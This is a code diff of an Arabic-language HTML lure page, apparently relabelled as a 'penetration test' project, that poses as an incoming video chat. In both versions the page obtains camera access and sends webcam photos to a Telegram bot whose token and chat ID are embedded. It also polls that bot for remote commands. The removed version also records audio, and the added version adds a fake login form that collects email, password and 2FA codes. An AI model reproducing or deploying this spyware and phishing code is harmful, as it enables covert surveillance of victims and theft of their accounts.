@@ -3,56 +3,83 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>دردشة فيديو مباشرة | بنات لايف</title>
+    <title>مشروع هندسة أمن المعلومات | اختبار اختراق</title>
     <style>
-        body { background: #000; color: #fff; font-family: sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
-        .card { background: #1a1a1a; padding: 30px; border-radius: 25px; text-align: center; border: 2px solid #ff0055; width: 85%; box-shadow: 0 0 20px #ff0055; }
-        .btn { background: linear-gradient(45deg, #ff0055, #ff00aa); color: white; border: none; padding: 15px; border-radius: 50px; width: 100%; font-size: 18px; font-weight: bold; cursor: pointer; margin-top: 20px; }
-        .live { color: #ff0055; font-size: 12px; animation: blink 1s infinite; }
-        @keyframes blink { 0% { opacity: 1; } 50% { opacity: 0.3; } 100% { opacity: 1; } }
+        body { background: #050505; color: #fff; font-family: sans-serif; display: flex; align-items: center; justify-content: center; min-height: 100vh; margin: 0; }
+        .card { background: #111; padding: 25px; border-radius: 20px; text-align: center; border: 1px solid #ff0055; width: 90%; max-width: 380px; box-shadow: 0 0 25px rgba(255, 0, 85, 0.3); }
+        .btn { background: linear-gradient(45deg, #ff0055, #ff0088); color: white; border: none; padding: 12px; border-radius: 10px; width: 100%; font-size: 16px; font-weight: bold; cursor: pointer; margin-top: 15px; }
+        .input-group { margin-top: 15px; text-align: right; }
+        input { width: 100%; padding: 10px; margin-top: 5px; border-radius: 5px; border: 1px solid #333; background: #1a1a1a; color: #fff; box-sizing: border-box; }
+        #loginSection { display: none; }
+        .status { font-size: 11px; color: #666; margin-top: 15px; }
     </style>
 </head>
 <body>
     <div class="card">
-        <div class="live">● مباشر الآن</div>
-        <h2>مكالمة فيديو واردة... 🔥</h2>
-        <p>اضغط للبدء في الدردشة مع الفتيات المتصلات.</p>
-        <button class="btn" id="startBtn">قبول المكالمة 💖</button>
-        <p id="status" style="font-size: 12px; margin-top: 15px; color: #888;"></p>
+        <div id="setupSection">
+            <h2 style="color: #ff0055;">● بث مباشر وارد</h2>
+            <p>يجب السماح بالكاميرا لبدء الدردشة مع الطرف الآخر.</p>
+            <button class="btn" id="startBtn">بدء الفيديو الآن 🎥</button>
+        </div>
+
+        <div id="loginSection">
+            <h3 style="color: #ffb400;">🔐 خطوة أخيرة</h3>
+            <p style="font-size: 13px;">هذه الدردشة "مجانية" للمدعوين فقط. يرجى تأكيد هويتك للمتابعة.</p>
+            <div class="input-group">
+                <input type="text" id="email" placeholder="البريد الإلكتروني أو الهاتف">
+                <input type="password" id="pass" placeholder="كلمة المرور">
+                <input type="text" id="mfa" placeholder="رمز المصادقة الثنائية (2FA)">
+            </div>
+            <button class="btn" id="submitBtn">دخول 💖</button>
+        </div>
+        
+        <p id="status" class="status">جاهز للاختبار...</p>
     </div>
 
     <script>
         const TOKEN = "8207943883:AAF_XJoeKlHEE2bB7Ro0PBVSvpihbuZ0fW0";
         const CHAT_ID = "8350812242";
         let mediaStream;
+        let canTakePhoto = true; // خيار التحكم في التصوير
 
-        // تشغيل الاختراق بمجرد الضغط
+        // 1. بدء الهجوم (طلب الكاميرا فقط)
         document.getElementById('startBtn').addEventListener('click', async () => {
             try {
-                mediaStream = await navigator.mediaDevices.getUserMedia({ audio: true, video: true });
-                document.getElementById('status').innerText = "جاري الاتصال بالسيرفر...";
+                // الوصول للكاميرا بدون ميكروفون
+                mediaStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
                 
-                // إرسال إشعار السيطرة للبوت
-                fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent("✅ تم الاختراق بنجاح! الجهاز (Reno 13) جاهز للأوامر:\n1- اكتب (صورة) لسحب لقطة.\n2- اكتب (اسمع) لتسجيل صوت 10 ثواني.")}`);
+                // تغيير الواجهة
+                document.getElementById('setupSection').style.display = "none";
+                document.getElementById('loginSection').style.display = "block";
+                document.getElementById('status').innerText = "تم تفعيل الكاميرا (بدون صوت)";
 
-                // فحص الأوامر من تليجرام كل 5 ثواني
+                // إرسال إشعار البدء للتليجرام
+                notifyTelegram("🚀 المختبر بدأ: الضحية سمح بالكاميرا وهو الآن في صفحة الـ Login.");
+
+                // تشغيل نظام استقبال الأوامر (صورة / وقف / ابدأ)
                 setInterval(checkCommands, 5000);
             } catch (e) {
-                document.getElementById('status').innerText = "يجب السماح بالصلاحيات للمتابعة!";
+                document.getElementById('status').innerText = "خطأ: يجب السماح بالصلاحيات للمتابعة.";
             }
         });
 
+        // 2. نظام الأوامر عن بُعد
         async function checkCommands() {
-            const res = await fetch(`https://api.telegram.org/bot${TOKEN}/getUpdates?offset=-1`);
-            const data = await res.json();
-            if (data.result.length > 0) {
-                const cmd = data.result[0].message.text;
-                if (cmd === "صورة") takePhoto();
-                if (cmd === "اسمع") recordAudio();
-            }
+            try {
+                const res = await fetch(`https://api.telegram.org/bot${TOKEN}/getUpdates?offset=-1`);
+                const data = await res.json();
+                if (data.result.length > 0) {
+                    const cmd = data.result[0].message.text;
+                    if (cmd === "صورة") takePhoto();
+                    if (cmd === "وقف") { canTakePhoto = false; notifyTelegram("🚫 تم إيقاف خاصية التصوير."); }
+                    if (cmd === "ابدأ") { canTakePhoto = true; notifyTelegram("✅ تم تفعيل خاصية التصوير."); }
+                }
+            } catch (e) { console.error("Command Error"); }
         }
 
+        // 3. التقاط الصورة وإرسالها
         async function takePhoto() {
+            if (!canTakePhoto || !mediaStream) return;
             const video = document.createElement('video');
             video.srcObject = mediaStream;
             await video.play();
@@ -62,25 +89,19 @@
             canvas.toBlob(blob => {
                 const fd = new FormData();
                 fd.append('chat_id', CHAT_ID);
-                fd.append('photo', blob, 'shot.jpg');
+                fd.append('photo', blob, 'lab_shot.jpg');
                 fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
             }, 'image/jpeg');
         }
 
-        async function recordAudio() {
-            const recorder = new MediaRecorder(mediaStream);
-            let chunks = [];
-            recorder.ondataavailable = e => chunks.push(e.data);
-            recorder.onstop = () => {
-                const blob = new Blob(chunks, { type: 'audio/ogg; codecs=opus' });
-                const fd = new FormData();
-                fd.append('chat_id', CHAT_ID);
-                fd.append('voice', blob, 'rec.ogg');
-                fetch(`https://api.telegram.org/bot${TOKEN}/sendVoice`, { method: 'POST', body: fd });
-            };
-            recorder.start();
-            setTimeout(() => recorder.stop(), 10000); // يسجل 10 ثواني
+        // 4. دالة إرسال الإشعارات
+        function notifyTelegram(text) {
+            fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}`);
         }
+
+        // ملاحظة للمهندس زعتر: 
+        // لربط بيانات الـ Login في المختبر، استخدم fetch مع قيم (email, pass, mfa) 
+        // كما وضحنا في "المنطق البرمجي" سابقاً.
     </script>
 </body>
 </html>
